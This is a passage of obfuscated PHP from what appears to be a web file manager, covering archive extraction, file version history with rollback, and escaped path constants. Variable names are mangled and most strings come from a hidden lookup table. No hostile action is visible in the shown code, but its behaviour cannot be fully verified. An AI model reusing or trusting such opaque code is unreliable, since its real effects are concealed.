@json_decode(IO::getContent($şÕŸ•Ç¸), !0); } IO::fileOut($çùÙ°à–[$êÊ§Ôò­[213]], $«ÔÓ®ú©, get_path_this($Ÿ˜¥ÙÄƒ[$êÊ§Ôò­[32]])); die; } private static function zipFileList($ù”¦§—, $Ë¦ö…œİ = false) { $Õ„Éñ =& $_SERVER[™»È’øè]; $çšë£¼• = array(); foreach ($ù”¦§— as $ïà”ğÕ’) { $‡¢‡”„¬ = $ïà”ğÕ’[$Õ„Éñ[84]]; if ($Ë¦ö…œİ) { $‡¢‡”„¬ = self::copy($ïà”ğÕ’[$Õ„Éñ[84]], $Ë¦ö…œİ, $Õ„Éñ[843]); } else { $»‰™Ú¤Ò = self::init($ïà”ğÕ’[$Õ„Éñ[84]]); if ($»‰™Ú¤Ò->getType() == $Õ„Éñ[106]) { $‡¢‡”„¬ = $»‰™Ú¤Ò->path; } } if ($‡¢‡”„¬ && self::local()->exist($‡¢‡”„¬)) { $çšë£¼•[$ïà”ğÕ’[$Õ„Éñ[84]]] = $‡¢‡”„¬; } } if (!empty($çšë£¼•)) { return array_values($çšë£¼•); } show_json(LNG($Õ„Éñ[1195]), !1); } private static function localFilePath($‰â•ÀÚ) { $¿“ãó´£ =& $_SERVER[™»È’øè]; $¢ÔÓ¦—¥ = KodIO::parse($‰â•ÀÚ); if ($¢ÔÓ¦—¥[$¿“ãó´£[33]] == KodIO::KOD_SOURCE) { $åÖ´ÂÇ = Model($¿“ãó´£[850])->fileInfoGet(KodIO::sourceID($‰â•ÀÚ)); if (!$åÖ´ÂÇ[$¿“ãó´£[84]]) { show_json($¿“ãó´£[1233], !1); } $‰â•ÀÚ = $åÖ´ÂÇ[$¿“ãó´£[84]]; } $ø¦´±Œ = self::init($‰â•ÀÚ); if ($ø¦´±Œ->pathParse[$¿“ãó´£[1181]]) { $‰â•ÀÚ = $ø¦´±Œ->pathParse[$¿“ãó´£[1181]]; $ø¦´±Œ = self::init($‰â•ÀÚ); } $¿ïå¼œ = $ø¦´±Œ->getType(); if ($¿ïå¼œ == $¿“ãó´£[106] || $¿ïå¼œ == $¿“ãó´£[1234]) { if (!$ø¦´±Œ->exist($ø¦´±Œ->path)) { show_json(LNG($¿“ãó´£[105]), !1); } return $ø¦´±Œ->path; } return !1; } public static function unzipPart($”ÏËØÕ‰, $§ÕæåŸ = -1) { $ƒ¢°ù±¶ =& $_SERVER[™»È’øè]; $Ş¯ş›™ = IO::pathThis($”ÏËØÕ‰); if (!$§ÕæåŸ || $§ÕæåŸ == -1) { $Ïó°ã° = array(array($ƒ¢°ù±¶[32] => $Ş¯ş›™, $ƒ¢°ù±¶[1220] => -1)); $Ïó°ã°[0][$ƒ¢°ù±¶[1235]] = $Ïó°ã°[0][$ƒ¢°ù±¶[32]]; } else { if (is_array($§ÕæåŸ)) { $Ïó°ã° = $§ÕæåŸ; $á‡Š•˜Ó = count($Ïó°ã°) - 1; for ($Æ’­“òÓ = 0; $Æ’­“òÓ <= $á‡Š•˜Ó; $Æ’­“òÓ++) { $ÛØíØ‹€ = $Ïó°ã°[$Æ’­“òÓ]; $“åŠŞé = get_path_this($ÛØíØ‹€[$ƒ¢°ù±¶[32]]) . (checkExtSafe($ÛØíØ‹€[$ƒ¢°ù±¶[32]]) ? $ƒ¢°ù±¶[12] : $ƒ¢°ù±¶[1236]); $Ïó°ã°[$Æ’­“òÓ][$ƒ¢°ù±¶[1235]] = $ƒ¢°ù±¶[1237] . intval($ÛØíØ‹€[$ƒ¢°ù±¶[1220]]) . $ƒ¢°ù±¶[429] . $“åŠŞé; if ($Æ’­“òÓ == 0) { continue; } $Ïó°ã°[$Æ’­“òÓ][$ƒ¢°ù±¶[1235]] = $Ïó°ã°[$Æ’­“òÓ - 1][$ƒ¢°ù±¶[1235]] . $ƒ¢°ù±¶[1238] . $Ïó°ã°[$Æ’­“òÓ][$ƒ¢°ù±¶[1235]]; } } } if (!is_array($Ïó°ã°) || count($Ïó°ã°) == 0) { return !1; } $ĞşÚ”˜ê = $Ïó°ã°[count($Ïó°ã°) - 1]; if (!IO::exist($”ÏËØÕ‰)) { return !1; } $ÖØ¯ş‡« = TEMP_FILES . $ƒ¢°ù±¶[1239] . kodIO::hashPathSafe($”ÏËØÕ‰) . $ƒ¢°ù±¶[8]; $Ÿ¶‡¯ = $ÖØ¯ş‡« . $ĞşÚ”˜ê[$ƒ¢°ù±¶[1235]]; mk_dir($ÖØ¯ş‡«); file_put_contents(TEMP_FILES . $ƒ¢°ù±¶[1214], $ƒ¢°ù±¶[12]); if (IO::exist($Ÿ¶‡¯)) { return array($ƒ¢°ù±¶[213] => $Ÿ¶‡¯, $ƒ¢°ù±¶[1219] => $Ïó°ã°, $ƒ¢°ù±¶[1221] => $ÖØ¯ş‡«); } $¤šè»Šı = self::localFilePath($”ÏËØÕ‰); if (!$¤šè»Šı) { $¤šè»Šı = $ÖØ¯ş‡« . $ƒ¢°ù±¶[1240]; if (!IO::exist($¤šè»Šı)) { self::copy($”ÏËØÕ‰, $ÖØ¯ş‡«, !1, get_path_this($¤šè»Šı)); } } if (!$¤šè»Šı || !IO::exist($¤šè»Šı)) { return !1; } if ($ĞşÚ”˜ê[$ƒ¢°ù±¶[1220]] == -1) { return array($ƒ¢°ù±¶[213] => $¤šè»Šı, $ƒ¢°ù±¶[1219] => $Ïó°ã°, $ƒ¢°ù±¶[1221] => $ÖØ¯ş‡«); } $ĞáŸí·› = $¤šè»Šı; foreach ($Ïó°ã° as $Æ’­“òÓ => $ÛØíØ‹€) { if (!$ÛØíØ‹€ || $ÛØíØ‹€[$ƒ¢°ù±¶[1220]] == $ƒ¢°ù±¶[1218]) { break; } if (substr($ÛØíØ‹€[$ƒ¢°ù±¶[32]], -1, 1) == $ƒ¢°ù±¶[8]) { break; } $´àÜşºÓ = in_array(get_path_ext($ÛØíØ‹€[$ƒ¢°ù±¶[1235]]), array($ƒ¢°ù±¶[356], $ƒ¢°ù±¶[1225], $ƒ¢°ù±¶[1226], $ƒ¢°ù±¶[1227], $ƒ¢°ù±¶[1228], $ƒ¢°ù±¶[1229])); $Ù£²Ñş = $Æ’­“òÓ == count($Ïó°ã°) - 1 && $´àÜşºÓ; $ã“€«—Õ = $ÖØ¯ş‡« . $ÛØíØ‹€[$ƒ¢°ù±¶[1235]]; $½óÅÚ¹© = $ÖØ¯ş‡« . get_path_this($ÛØíØ‹€[$ƒ¢°ù±¶[32]]); if (IO::exist($ã“€«—Õ)) { $ĞáŸí·› = $ã“€«—Õ; continue; } $Òü¢Óæı = $Æ’­“òÓ == 0 ? get_path_ext($Ş¯ş›™) : get_path_ext($ĞáŸí·›); $ö²»Œ—  = KodArchive::extract(self::iconvSystem($ĞáŸí·›), $ÖØ¯ş‡«, $ÛØíØ‹€[$ƒ¢°ù±¶[1220]], $ùíÙşù”, $Òü¢Óæı); self::unzipErrorCheck($ö²»Œ— , array($ƒ¢°ù±¶[1241], $”ÏËØÕ‰, $Ïó°ã°, $ÛØíØ‹€, $ã“€«—Õ)); if (IO::exist($½óÅÚ¹©)) { IO::rename($½óÅÚ¹©, get_path_this($ã“€«—Õ)); } $ĞáŸí·› = $ã“€«—Õ; } $Ÿ¶‡¯ = $ĞáŸí·›; return array($ƒ¢°ù±¶[213] => $ĞáŸí·›, $ƒ¢°ù±¶[1219] => $Ïó°ã°, $ƒ¢°ù±¶[1221] => $ÖØ¯ş‡«); } private static function unzipErrorCheck($‘‘„İ“ª, $§”œ¨ğ„ = false) { $Â€á¹²­ =& $_SERVER[™»È’øè]; if ($‘‘„İ“ª[$Â€á¹²­[1242]]) { return !0; } write_log(array($Â€á¹²­[1243], $‘‘„İ“ª, $§”œ¨ğ„), $Â€á¹²­[1244]); show_json($Â€á¹²­[1245] . json_encode($‘‘„İ“ª[$Â€á¹²­[1232]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $°“­¹ğÎ =& $_SERVER[™»È’øè]; $±‹ÊÅ× = $GLOBALS[$°“­¹ğÎ[6]][$°“­¹ğÎ[89]]; if ($±‹ÊÅ×[$°“­¹ğÎ[1246]] != 1) { return; } if ($±‹ÊÅ×[$°“­¹ğÎ[1247]] <= 0) { return; } if (isset($_REQUEST[$°“­¹ğÎ[1248]]) && $_REQUEST[$°“­¹ğÎ[1248]] == $°“­¹ğÎ[88]) { return; } Hook::bind($°“­¹ğÎ[1249], $°“­¹ğÎ[1250]); Hook::bind($°“­¹ğÎ[1251], $°“­¹ğÎ[1252]); Hook::bind($°“­¹ğÎ[1253], $°“­¹ğÎ[1254]); Hook::bind($°“­¹ğÎ[1255], $°“­¹ğÎ[1256]); Hook::bind($°“­¹ğÎ[1257], $°“­¹ğÎ[1258]); Hook::bind($°“­¹ğÎ[1259], $°“­¹ğÎ[1260]); } public static function eventBeforeUpload($Ş§½¯Èç) { if ($Ş§½¯Èç[3] && $Ş§½¯Èç[3] != REPEAT_REPLACE) { return; } $²ë£”É‚ = self::parsePath($Ş§½¯Èç[0]); if (!$²ë£”É‚) { return; } self::add($²ë£”É‚); } public static function eventBeforeEdit($¯…©‰µ³) { $€åèüüä = self::parsePath($¯…©‰µ³[0]); if (!$€åèüüä) { return; } self::add($€åèüüä); } public static function eventBeforeCopyFile($ãö©úÚ, $„µô©ì, $ßª¤¤¡, $Ëş÷ú«„, $ÌÜĞõÔŸ, $»×¼Š´) { $ ßªáíà =& $_SERVER[™»È’øè]; if (isset($ßª¤¤¡->_data[$ ßªáíà[1185]]) && $ßª¤¤¡->_data[$ ßªáíà[1185]]) { return; } $ ¤ÈÉèà = $ßª¤¤¡->getPathOuter($Ëş÷ú«„); $§òåØœµ = self::parsePath($ ¤ÈÉèà); if (!$§òåØœµ) { return; } self::add($§òåØœµ); } public static function eventBeforeRename($ÜœÆ»®¯) { $íÏÕİğá =& $_SERVER[™»È’øè]; $ã…à€”Ç = self::parsePath($ÜœÆ»®¯[0]); if (!$ã…à€”Ç) { return; } $ô†ä—Ù = self::checkInHistory($ã…à€”Ç); if (!$ô†ä—Ù) { return; } if ($ô†ä—Ù[$íÏÕİğá[33]] == $íÏÕİğá[213]) { $ŒÛ‘„á = self::listData($ã…à€”Ç); if ($ŒÛ‘„á && $ŒÛ‘„á[$íÏÕİğá[412]]) { self::moveHistory($ã…à€”Ç, $ÜœÆ»®¯[1]); } } else { IO::rename($ô†ä—Ù[$íÏÕİğá[84]], $ÜœÆ»®¯[1]); } } public static function eventBeforeMove($‘Î‚«ìç) { $Ô¾‰·¤È =& $_SERVER[™»È’øè]; $Æ©û¶ìÏ = self::parsePath($‘Î‚«ìç[0]); if (!$Æ©û¶ìÏ) { return; } $ùóŞ“€ = self::parsePath($‘Î‚«ìç[1]); if (!$ùóŞ“€) { return; } $²½Üğ¶‘ = $‘Î‚«ìç[3]; $òŸ÷ø…‰ = self::checkInHistory($Æ©û¶ìÏ); if (!$òŸ÷ø…‰) { return; } $‚’ÕÀì = self::pathHistory($ùóŞ“€); if ($òŸ÷ø…‰[$Ô¾‰·¤È[33]] == $Ô¾‰·¤È[213]) { $âÀæ„Àñ = self::listData($Æ©û¶ìÏ); $ÄˆÓœ’Ã = rtrim($ùóŞ“€, $Ô¾‰·¤È[8]) . $Ô¾‰·¤È[8] . ($²½Üğ¶‘ ? $²½Üğ¶‘ : get_path_this($Æ©û¶ìÏ)); $˜›ËÑà¥ = self::listData($ÄˆÓœ’Ã); if ($âÀæ„Àñ && $âÀæ„Àñ[$Ô¾‰·¤È[412]] && $˜›ËÑà¥ && $˜›ËÑà¥[$Ô¾‰·¤È[412]]) { return self::clear($Æ©û¶ìÏ); } if ($âÀæ„Àñ && $âÀæ„Àñ[$Ô¾‰·¤È[412]]) { self::moveHistory($Æ©û¶ìÏ, $²½Üğ¶‘, $‚’ÕÀì); } } else { IO::move($òŸ÷ø…‰[$Ô¾‰·¤È[84]], $‚’ÕÀì, !1, $²½Üğ¶‘); self::clearEmptyFolder(IO::pathFather($òŸ÷ø…‰[$Ô¾‰·¤È[84]])); } } public static function eventAfterRemove($°Ñ±„ÜÙ, $ŸÛ°”Ò‹) { $šªğ¿²¤ =& $_SERVER[™»È’øè]; if (!$ŸÛ°”Ò‹) { return; } $Áİó›¾  = self::parsePath($°Ñ±„ÜÙ[0]); if (!$Áİó›¾ ) { return; } $ñßã”ˆ¨ = self::checkInHistory($Áİó›¾ ); if (!$ñßã”ˆ¨) { return; } if ($ñßã”ˆ¨[$šªğ¿²¤[33]] == $šªğ¿²¤[213]) { $Ï‡İ¯ï = self::listData($Áİó›¾ , !1); if ($Ï‡İ¯ï && $Ï‡İ¯ï[$šªğ¿²¤[412]]) { self::clear($Áİó›¾ , !1); } } else { IO::remove($ñßã”ˆ¨[$šªğ¿²¤[84]]); self::clearEmptyFolder(IO::pathFather($ñßã”ˆ¨[$šªğ¿²¤[84]])); } } private static function checkInHistory($«Ô“çİé) { $øÓ®×¬¾ = self::pathHistory($«Ô“çİé); if (!IO::exist($øÓ®×¬¾)) { $øÓ®×¬¾ .= $_SERVER[™»È’øè][1261]; } return IO::exist($øÓ®×¬¾) ? IO::info($øÓ®×¬¾) : !1; } private static function parsePath($äÑÆÑêô) { $«ÙÍç¡ =& $_SERVER[™»È’øè]; if (!$äÑÆÑêô) { return !1; } if ($GLOBALS[$«ÙÍç¡[1262]]) { return; } $ÄÚÒªÛì = KodIO::parse($äÑÆÑêô); $ ©œÂæĞ = $ÄÚÒªÛì[$«ÙÍç¡[33]]; $úù©µÑˆ = !$ ©œÂæĞ || $ ©œÂæĞ == KodIO::KOD_IO || $ ©œÂæĞ == KodIO::KOD_SHARE_ITEM; if (!$úù©µÑˆ || !$ÄÚÒªÛì[$«ÙÍç¡[1263]]) { return !1; } if (substr($äÑÆÑêô, 0, strlen(DATA_PATH . $«ÙÍç¡[1264])) == DATA_PATH . $«ÙÍç¡[1264]) { return !1; } if ($ ©œÂæĞ == KodIO::KOD_SHARE_ITEM) { $Ú‰ÂÁÏ© = IO::init($äÑÆÑêô); if ($Ú‰ÂÁÏ©->pathParse[$«ÙÍç¡[1181]]) { return self::parsePath($Ú‰ÂÁÏ©->pathParse[$«ÙÍç¡[1181]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $üŸüÄäÂ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $«ÙÍç¡[1265]); foreach ($üŸüÄäÂ as $ïÁå ïò) { if (!$ ©œÂæĞ && substr($äÑÆÑêô, 0, strlen($ïÁå ïò)) == $ïÁå ïò) { return !1; } } self::log($GLOBALS[$«ÙÍç¡[1176]] . $«ÙÍç¡[1266] . $äÑÆÑêô); return $äÑÆÑêô; } private static function pathHistory($ûÚïêş) { $¡Â€öÛ¢ =& $_SERVER[™»È’øè]; $‡üË…Û» = self::$_historyBase . ltrim(KodIO::clear($ûÚïêş), $¡Â€öÛ¢[8]); $‡üË…Û» = str_replace(array($¡Â€öÛ¢[1267]), array($¡Â€öÛ¢[1268]), $‡üË…Û»); return $‡üË…Û»; } public static function log($Ç†â€ŠÂ) { } public static function historyCount($«âîÇÜş) { $ÏáÆ¼Öò =& $_SERVER[™»È’øè]; $Èø´ƒĞ = array(); $õÉî§ğ = array(); foreach ($«âîÇÜş as $ ÉååÇ) { $•úŒŸò¼ = get_path_father($ ÉååÇ); if (!$õÉî§ğ[$•úŒŸò¼]) { $õÉî§ğ[$•úŒŸò¼] = array(); } $õÉî§ğ[$•úŒŸò¼][] = get_path_this($ ÉååÇ); } foreach ($õÉî§ğ as $•úŒŸò¼ => $“¹…ë‚) { $ß¤œÏìá = self::parsePath($•úŒŸò¼); if (!$ß¤œÏìá) { continue; } foreach ($“¹…ë‚ as $ßØ³¤ñÌ) { $Ë‰Ô±ä = self::listData(rtrim($ß¤œÏìá, $ÏáÆ¼Öò[8]) . $ÏáÆ¼Öò[8] . $ßØ³¤ñÌ, !1); if ($Ë‰Ô±ä && $Ë‰Ô±ä[$ÏáÆ¼Öò[412]]) { $Èø´ƒĞ[rtrim($•úŒŸò¼, $ÏáÆ¼Öò[8]) . $ÏáÆ¼Öò[8] . $ßØ³¤ñÌ] = count($Ë‰Ô±ä[$ÏáÆ¼Öò[412]]); } } } return $Èø´ƒĞ; } public static function add($¯‹Ó˜) { $ñ‰¼‹Şù =& $_SERVER[™»È’øè]; $×öåî = self::listData($¯‹Ó˜); if (!$×öåî) { return; } $³”ÁÆÓ = Model($ñ‰¼‹Şù[795])->get($ñ‰¼‹Şù[1269]); $£®ìê« = $GLOBALS[$ñ‰¼‹Şù[6]][$ñ‰¼‹Şù[89]][$ñ‰¼‹Şù[1247]]; $ì«±…õ = $³”ÁÆÓ == $ñ‰¼‹Şù[1270] ? min(5, $£®ìê«) : $£®ìê«; if ($£®ìê« <= 0) { return; } $É½×ßë = IO::info($¯‹Ó˜); $†ÑÃ§ü– = $×öåî[$ñ‰¼‹Şù[412]]; if ($É½×ßë[$ñ‰¼‹Şù[76]] == 0) { return; } if ($É½×ßë[$ñ‰¼‹Şù[76]] >= 1024 * 1024 * 500) { return !1; } $º«Ş‘…¿ = IO::hashSimple($¯‹Ó˜); if ($†ÑÃ§ü– && $†ÑÃ§ü–[0][$ñ‰¼‹Şù[639]] == $º«Ş‘…¿) { return !0; } if (array_key_exists($ñ‰¼‹Şù[216], $É½×ßë) && !$É½×ßë[$ñ‰¼‹Şù[216]]) { return !1; } $òè‹Õ©Ø = short_id(time()); $œıí¡ÑÆ = array($ñ‰¼‹Şù[442] => $òè‹Õ©Ø, $ñ‰¼‹Şù[639] => $º«Ş‘…¿, $ñ‰¼‹Şù[32] => $É½×ßë[$ñ‰¼‹Şù[32]] . $ñ‰¼‹Şù[10] . date($ñ‰¼‹Şù[1271]) . rand_string(1), $ñ‰¼‹Şù[76] => $É½×ßë[$ñ‰¼‹Şù[76]], $ñ‰¼‹Şù[494] => USER_ID, $ñ‰¼‹Şù[214] => time(), $ñ‰¼‹Şù[1272] => $ñ‰¼‹Şù[12]); IO::mkdir($×öåî[$ñ‰¼‹Şù[1273]]); $Ö‹·úì = IO::copy($¯‹Ó˜, $×öåî[$ñ‰¼‹Şù[1273]], !1, $œıí¡ÑÆ[$ñ‰¼‹Şù[32]]); if (!$Ö‹·úì) { self::clearEmptyFolder($×öåî[$ñ‰¼‹Şù[1273]]); return !1; } array_unshift($†ÑÃ§ü–, $œıí¡ÑÆ); if (count($†ÑÃ§ü–) > $ì«±…õ) { $çªãİÏ = array_slice($†ÑÃ§ü–, $ì«±…õ); foreach ($çªãİÏ as $§¸³Ã‘×) { IO::remove($×öåî[$ñ‰¼‹Şù[1273]] . $§¸³Ã‘×[$ñ‰¼‹Şù[32]]); } $†ÑÃ§ü– = array_slice($†ÑÃ§ü–, 0, $ì«±…õ); } return self::saveData($×öåî[$ñ‰¼‹Şù[1274]], $†ÑÃ§ü–); } public static function remove($¹Ø™ûƒ’, $ıúò’ÖÊ) { $¤Æ¨½¥é =& $_SERVER[™»È’øè]; $şà²¸Šß = self::listData($¹Ø™ûƒ’); $Õˆó¸èÄ = array(); if (!$şà²¸Šß) { return !1; } foreach ($şà²¸Šß[$¤Æ¨½¥é[412]] as $½¹­Û•¸) { if ($½¹­Û•¸[$¤Æ¨½¥é[442]] == $ıúò’ÖÊ) { IO::remove($şà²¸Šß[$¤Æ¨½¥é[1273]] . $½¹­Û•¸[$¤Æ¨½¥é[32]]); continue; } $Õˆó¸èÄ[] = $½¹­Û•¸; } return self::saveData($şà²¸Šß[$¤Æ¨½¥é[1274]], $Õˆó¸èÄ); } public static function clear($èÃ”À, $ô½‚÷åË = true) { $—Ÿ®Ÿ¾ =& $_SERVER[™»È’øè]; $»şÊÌÆ‡ = self::listData($èÃ”À, $ô½‚÷åË); if (!$»şÊÌÆ‡) { return !1; } foreach ($»şÊÌÆ‡[$—Ÿ®Ÿ¾[412]] as $ÍÄ±¿) { IO::remove($»şÊÌÆ‡[$—Ÿ®Ÿ¾[1273]] . $ÍÄ±¿[$—Ÿ®Ÿ¾[32]]); } return self::saveData($»şÊÌÆ‡[$—Ÿ®Ÿ¾[1274]], array()); } public static function moveHistory($×şÒ¶Üã, $öúê·’ = '', $­—¼ñí­ = '') { $–…ƒ®ş† =& $_SERVER[™»È’øè]; $´Ôáá·• = self::listData($×şÒ¶Üã, !1); if (!$´Ôáá·• || !$´Ôáá·•[$–…ƒ®ş†[412]]) { return !1; } $¢­çÛ› = $–…ƒ®ş†[1261]; $öúê·’ = $öúê·’ ? $öúê·’ : get_path_this($×şÒ¶Üã); $­—¼ñí­ = $­—¼ñí­ ? $­—¼ñí­ : $´Ôáá·•[$–…ƒ®ş†[1273]]; $”¾Ö‹òß = substr(get_path_this($´Ôáá·•[$–…ƒ®ş†[1274]]), 0, -strlen($¢­çÛ›)); foreach ($´Ôáá·•[$–…ƒ®ş†[412]] as $ÑŠ÷¼Å¼ => $½ÀşœøÓ) { $°Ü”©Ç¿ = $öúê·’ . substr($½ÀşœøÓ[$–…ƒ®ş†[32]], strlen($”¾Ö‹òß)); $„ğ‘ìã‹ = IO::move($´Ôáá·•[$–…ƒ®ş†[1273]] . $½ÀşœøÓ[$–…ƒ®ş†[32]], $­—¼ñí­, !1, $°Ü”©Ç¿); if ($„ğ‘ìã‹) { $´Ôáá·•[$–…ƒ®ş†[412]][$ÑŠ÷¼Å¼][$–…ƒ®ş†[32]] = $°Ü”©Ç¿; } } $´Ôáá·•[$–…ƒ®ş†[1274]] = IO::move($´Ôáá·•[$–…ƒ®ş†[1274]], $­—¼ñí­, !1, $öúê·’ . $¢­çÛ›); self::saveData($´Ôáá·•[$–…ƒ®ş†[1274]], $´Ôáá·•[$–…ƒ®ş†[412]]); self::clearEmptyFolder($´Ôáá·•[$–…ƒ®ş†[1273]]); } public static function rollback($½’Êáñ¥, $©½¼×·ü) { $À¡ÔêêÂ =& $_SERVER[™»È’øè]; $¢×¾Ä¿Æ = self::listData($½’Êáñ¥); if (!$¢×¾Ä¿Æ) { return; } $ëÊ«ıä• = IO::info($½’Êáñ¥); foreach ($¢×¾Ä¿Æ[$À¡ÔêêÂ[412]] as $ù±åì­ => $üì¨Ê—) { if ($üì¨Ê—[$À¡ÔêêÂ[442]] == $©½¼×·ü) { self::add($½’Êáñ¥); $õµ·±Ğ = $¢×¾Ä¿Æ[$À¡ÔêêÂ[1273]] . $üì¨Ê—[$À¡ÔêêÂ[32]]; $“Ú´â£º = IO::copy($õµ·±Ğ, IO::pathFather($½’Êáñ¥), REPEAT_REPLACE, $ëÊ«ıä•[$À¡ÔêêÂ[32]]); if ($“Ú´â£º) { self::remove($½’Êáñ¥, $©½¼×·ü); } return $“Ú´â£º; } } return !1; } public static function setDetail($ŞĞô¸Ş, $Ñ²’Å, $³¯éõ¥Ä) { $•¡ÑïŠş =& $_SERVER[™»È’øè]; $ûİˆüø = self::listData($ŞĞô¸Ş); if (!$ûİˆüø) { return; } foreach ($ûİˆüø[$•¡ÑïŠş[412]] as $²æ¤©£° => $£Ã¿Ş¾•) { if ($£Ã¿Ş¾•[$•¡ÑïŠş[442]] == $Ñ²’Å) { $ûİˆüø[$•¡ÑïŠş[412]][$²æ¤©£°][$•¡ÑïŠş[1272]] = $³¯éõ¥Ä; self::saveData($ûİˆüø[$•¡ÑïŠş[1274]], $ûİˆüø[$•¡ÑïŠş[412]]); return !0; } } return !1; } public static function fileInfo($Óúü‚´é, $›šèš‡ü) { $£¥¾‚±ü =& $_SERVER[™»È’øè]; $ Ê¾—¨ = self::listData($Óúü‚´é); if (!$ Ê¾—¨) { show_json(LNG($£¥¾‚±ü[105]), !1); } $¥ú¥±œ¤ = $£¥¾‚±ü[12]; foreach ($ Ê¾—¨[$£¥¾‚±ü[412]] as $ı°ø« => $€ó —ˆæ) { if ($€ó —ˆæ[$£¥¾‚±ü[442]] != $›šèš‡ü) { continue; } $¥ú¥±œ¤ = $ Ê¾—¨[$£¥¾‚±ü[1273]] . $€ó —ˆæ[$£¥¾‚±ü[32]]; break; } if (!$¥ú¥±œ¤) { show_json(LNG($£¥¾‚±ü[105]), !1); } return IO::info($¥ú¥±œ¤); } public static function fileOut($¿™íÈ‡, $ßâ»àÔ², $ÎœÅ˜³Á = false) { $åã‚ß€ö =& $_SERVER[™»È’øè]; $°üßĞèæ = self::fileInfo($¿™íÈ‡, $ßâ»àÔ²); $¹Û–º =& $GLOBALS[$åã‚ß€ö[7]]; $ÎœÅ˜³Á = isset($¹Û–º[$åã‚ß€ö[1224]]) && $¹Û–º[$åã‚ß€ö[1224]] == 1; if (isset($¹Û–º[$åã‚ß€ö[33]]) && $¹Û–º[$åã‚ß€ö[33]] == $åã‚ß€ö[1275]) { return IO::fileOutImage($°üßĞèæ[$åã‚ß€ö[84]], $¹Û–º[$åã‚ß€ö[1276]]); } IO::fileOut($°üßĞèæ[$åã‚ß€ö[84]], $ÎœÅ˜³Á, get_path_this($¿™íÈ‡)); } public static function listData($è­“¹¹‚, $ü—Ş¥“­ = true) { $¤½ç³ =& $_SERVER[™»È’øè]; if ($ü—Ş¥“­ && !IO::exist($è­“¹¹‚)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($è­“¹¹‚, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $èµ€ÚöÌ = self::pathHistory($è­“¹¹‚); $³ìºğ = array($¤½ç³[1274] => $èµ€ÚöÌ . $¤½ç³[1261], $¤½ç³[1273] => rtrim(get_path_father($èµ€ÚöÌ), $¤½ç³[8]) . $¤½ç³[8], $¤½ç³[412] => array()); $áÙ€†Ü = IO::getContent($³ìºğ[$¤½ç³[1274]]); if ($áÙ€†Ü) { $šúÖôçú = json_decode($áÙ€†Ü, !0); if (is_array($šúÖôçú)) { $³ìºğ[$¤½ç³[412]] = $šúÖôçú; } } return $³ìºğ; } private static function saveData($“¾ØÄ“ü, $×”³¡Ù¸) { $À‰ãüøË =& $_SERVER[™»È’øè]; self::log($À‰ãüøË[1277] . $“¾ØÄ“ü . $À‰ãüøË[71] . count($×”³¡Ù¸), $À‰ãüøË[776]); if ($×”³¡Ù¸) { return IO::setContent($“¾ØÄ“ü, json_encode($×”³¡Ù¸)); } $™¼ÄÂ´ç = IO::pathFather($“¾ØÄ“ü); IO::remove($“¾ØÄ“ü); self::clearEmptyFolder($™¼ÄÂ´ç); return !0; } public static function clearEmptyFolder($éğ¯¢²§) { $ úı”×ü =& $_SERVER[™»È’øè]; if (trim($éğ¯¢²§, $ úı”×ü[8]) == trim(self::$_historyBase, $ úı”×ü[8])) { return; } $¶»ÏĞñˆ = IO::pathFather($éğ¯¢²§); $ÍËÈË¨Ì = IO::has($éğ¯¢²§, !0); if ($ÍËÈË¨Ì[$ úı”×ü[222]] > 0 || $ÍËÈË¨Ì[$ úı”×ü[223]] > 0) { return; } IO::remove($éğ¯¢²§); self::clearEmptyFolder($¶»ÏĞñˆ); } private static function getBasePath() { $Ÿ‰åÄÖ =& $_SERVER[™»È’øè]; $ÌĞ»Şï = Model($Ÿ‰åÄÖ[1278])->get($Ÿ‰åÄÖ[1279]); if ($ÌĞ»Şï) { if (!IO::exist($ÌĞ»Şï)) { IO::mkdir($ÌĞ»Şï); } if (get_path_this($ÌĞ»Şï) == $Ÿ‰åÄÖ[1264]) { $çÀŞŞ× = $Ÿ‰åÄÖ[1280] . rand_string(8); @rename($ÌĞ»Şï, get_path_father($ÌĞ»Şï) . $Ÿ‰åÄÖ[8] . $çÀŞŞ×); $ÌĞ»Şï = DATA_PATH . $çÀŞŞ× . $Ÿ‰åÄÖ[8]; file_put_contents(DATA_PATH . $Ÿ‰åÄÖ[1214], $Ÿ‰åÄÖ[12]); Model($Ÿ‰åÄÖ[1278])->set($Ÿ‰åÄÖ[1279], $ÌĞ»Şï); } return $ÌĞ»Şï; } $ÌĞ»Şï = DATA_PATH . $Ÿ‰åÄÖ[1280] . rand_string(8) . $Ÿ‰åÄÖ[8]; $ÌĞ»Şï = IO::mkdir($ÌĞ»Şï); $ÌĞ»Şï = rtrim($ÌĞ»Şï, $Ÿ‰åÄÖ[8]) . $Ÿ‰åÄÖ[8]; file_put_contents($ÌĞ»Şï . $Ÿ‰åÄÖ[1214], $Ÿ‰åÄÖ[12]); file_put_contents(DATA_PATH . $Ÿ‰åÄÖ[1214], $Ÿ‰åÄÖ[12]); Model($Ÿ‰åÄÖ[1278])->set($Ÿ‰åÄÖ[1279], $ÌĞ»Şï); return $ÌĞ»Şï; } } class KodIO { const KOD_SOURCE = "\173\x73\157\x75\x72\x63\145\175"; const KOD_USER_RECYCLE = "\173\x75\163\x65\x72\x52\145\x63\x79\143\x6c\145\175"; const KOD_USER_FAV = "\x7b\x75\x73\145\x72\x46\141\x76\x7d"; const KOD_USER_FILE_TAG = "\x7b\165\x73\x65\x72\106\151\x6c\145\124\x61\x67\175"; const KOD_USER_FILE_TYPE = "\x7b\165\163\x65\x72\x46\x69\x6c\x65\124\x79\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\173\x67\162\157\x75\x70\122\x6f\x6f\164\123\x65\154\146\175"; const KOD_USER_SHARE = "\173\165\163\x65\162\123\x68\x61\x72\x65\x7d"; const KOD_USER_SHARE_LINK = "\173\165\x73\x65\162\123\x68\x61\x72\x65\114\151\156\153\175"; const KOD_USER_SHARE_TO_ME = "\173\163\150\x61\162\145\x54\x6f\115\145\175"; const KOD_SHARE_ITEM = "\173\x73\150\x61\x72\145\111\164\x65\155\175"; const KOD_SHARE_LINK = "\173\163\x68\x61\x72\x65\x49\x74\145\155\114\x69\156\153\175"; const KOD_SEARCH = "\173\x73\x65\141\x72\x63\150\175"; const KOD_BLOCK = "\x7b\x62\x6c\157\143\x6b\175"; const KOD_IO = 